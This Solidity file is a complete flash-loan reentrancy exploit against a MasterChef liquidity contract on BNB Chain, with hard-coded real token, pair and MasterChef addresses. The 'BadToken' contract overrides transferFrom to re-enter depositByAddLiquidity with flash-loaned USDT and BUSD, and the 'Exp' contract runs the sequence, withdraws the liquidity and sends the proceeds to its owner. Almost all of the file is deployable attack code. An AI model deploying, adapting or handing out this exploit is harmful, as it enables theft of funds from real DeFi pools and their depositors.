pragma solidity 0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "./interfaces/IPancakeCallee.sol";
import "./interfaces/IPancakePair.sol";
import "hardhat/console.sol";

// 1. Deploy token X, Y
// 2. Flashloan to get usdt and busd and then send to token X
// 3. Call depositByAddLiquidity with token X, Y
// 4. In the transferFrom of token X, re-enter depositByAddLiquidity with usdt and busd
// 5. Withdraw liqudity
// 6. Repay flashloan

interface IMasterChef {
  struct UserInfo {
      uint256 amount; // How many LP tokens the user has provided.
      uint256 rewardDebt; // Reward debt. See explanation below.
  }

  function userInfo(uint256 _pid, address _account) external view returns (UserInfo memory);
  function depositByAddLiquidity(uint256 _pid, address[2] memory _tokens, uint256[2] memory _amounts) external;
  function withdrawAndRemoveLiquidity(uint256 _pid, uint256 _amount, bool isBNB) external;
}

contract GoodToken is ERC20("", "") {
  constructor(uint256 supply) {
    _mint(msg.sender, supply);
  }
}

contract BadToken is ERC20("", "") {
  address public immutable owner;

  address public constant USDT_BUSD_PAIR = address(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); 
  address public constant USDT = address(0x55d398326f99059fF775485246999027B3197955);
  address public constant BUSD = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  address public constant MASTER_CHEF = address(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4); 

  uint256 public constant USDT_BUSD_POOL_ID = 18;

  constructor(uint256 supply) {
    owner = msg.sender;
    _mint(msg.sender, supply);
  }

  function transferFrom(address from, address to, uint256 value) public override returns (bool) {
    if (from == MASTER_CHEF) {
      uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));
      uint256 busdBalance = IERC20(BUSD).balanceOf(address(this));
      IERC20(USDT).approve(MASTER_CHEF, usdtBalance);
      IERC20(BUSD).approve(MASTER_CHEF, busdBalance);

      address[2] memory tokens;
      tokens[0] = USDT;
      tokens[1] = BUSD;

      uint256[2] memory amounts;
      amounts[0] = usdtBalance;
      amounts[1] = busdBalance;

      IMasterChef(MASTER_CHEF).depositByAddLiquidity(
        USDT_BUSD_POOL_ID,
        tokens,
        amounts
      );
    }

    return super.transferFrom(from, to, value);
  }

  function withdrawLiquidity() external {
    require(msg.sender == owner, "Not owner");

    IMasterChef.UserInfo memory userInfo = IMasterChef(MASTER_CHEF)
      .userInfo(USDT_BUSD_POOL_ID, address(this));       

    IMasterChef(MASTER_CHEF).withdrawAndRemoveLiquidity(USDT_BUSD_POOL_ID, userInfo.amount, false);        
  }

  function withdrawAssets() external {
    require(msg.sender == owner, "Not owner");

    uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));
    uint256 busdBalance = IERC20(BUSD).balanceOf(address(this));
    IERC20(USDT).transfer(owner, usdtBalance);
    IERC20(BUSD).transfer(owner, busdBalance);
  }
}

contract Exp is IPancakeCallee {
  address public immutable owner;

  address public constant USDT_BUSD_PAIR = address(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); 
  address public constant USDT = address(0x55d398326f99059fF775485246999027B3197955);
  address public constant BUSD = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  address public constant MASTER_CHEF = address(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4); 

  uint256 public constant USDT_BUSD_POOL_ID = 18;
  uint256 public constant SUPPLY = 10 ** 18;

  uint256 flashloanSize;
  address badToken;
  address goodToken;

  constructor() {
    owner = msg.sender;
  }

  function prepare(uint256 _flashloanSize) external {
    flashloanSize = _flashloanSize;
    goodToken = address(new GoodToken(SUPPLY));
    badToken = address(new BadToken(SUPPLY));
  }

  function trigger() external {
    _flashloan();
  }

  function pancakeCall(
    address operator,
    uint256 amount0Out,
    uint256 amount1Out,
    bytes calldata data
  )
    external override
  {
    IERC20(USDT).transfer(badToken, amount0Out);
    IERC20(BUSD).transfer(badToken, amount1Out);

    IERC20(badToken).approve(MASTER_CHEF, SUPPLY);
    IERC20(goodToken).approve(MASTER_CHEF, SUPPLY);

    address[2] memory tokens;
    tokens[0] = badToken;
    tokens[1] = goodToken;

    uint256[2] memory amounts;
    amounts[0] = SUPPLY;
    amounts[1] = SUPPLY;
    IMasterChef(MASTER_CHEF).depositByAddLiquidity(
      USDT_BUSD_POOL_ID,
      tokens,
      amounts
    );

    BadToken(badToken).withdrawLiquidity();
    BadToken(badToken).withdrawAssets();

    _withdrawLiquidity();
    _repayFlashLoan();
    _withdrawAssets();
  }

  function _withdrawLiquidity() internal {
    IMasterChef.UserInfo memory userInfo = IMasterChef(MASTER_CHEF)
      .userInfo(USDT_BUSD_POOL_ID, address(this));       

    IMasterChef(MASTER_CHEF).withdrawAndRemoveLiquidity(USDT_BUSD_POOL_ID, userInfo.amount, false);        
  }

  function _withdrawAssets() internal {
    uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));
    uint256 busdBalance = IERC20(BUSD).balanceOf(address(this));
    IERC20(USDT).transfer(owner, usdtBalance);
    IERC20(BUSD).transfer(owner, busdBalance);
  }

  function _flashloan() internal {
    uint256 amount0Out = flashloanSize;
    uint256 amount1Out = flashloanSize;
    IPancakePair(USDT_BUSD_PAIR).swap(
      amount0Out,
      amount1Out,
      address(this),
      "0xff"
    );
  }

  function _repayFlashLoan() internal {
    uint256 repayAmount = flashloanSize * 1003 / 1000;
    IERC20(USDT).transfer(USDT_BUSD_PAIR, repayAmount);
    IERC20(BUSD).transfer(USDT_BUSD_PAIR, repayAmount);
  }
}
